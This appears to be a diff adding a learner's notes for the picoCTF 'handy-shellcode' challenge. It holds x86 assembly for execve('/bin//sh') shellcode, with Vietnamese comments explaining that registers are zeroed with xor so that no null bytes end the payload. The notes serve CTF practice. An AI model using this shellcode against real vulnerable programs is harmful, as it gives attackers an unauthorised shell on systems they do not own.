@@ -1,0 +1,18 @@
+SHELLCODE - PICOCTF - HANDY/SHELLCODE
+xor eax, eax
+xor edx, edx
+xor ecx, ecx
+add eax, 0x0b
+xor ebx, ebx        ; đưa ebx về giá trị 0x00 - Null
+push ebx            ; đưa null lên trước
+push 0x68732f2f     ; địa chỉ của chuỗi cần thực thi
+push 0x6e69622f
+mov ebx, esp
+int 0x80
+
+xét edx, ecx = 0
+sử dụng xor vì nếu gán trực tiếp cho 0x0 thì 
+khi thành shellcode nó sẽ đọc đến kí tự ý 
+và nhận dạng nó là null và dừng đọc
+
+
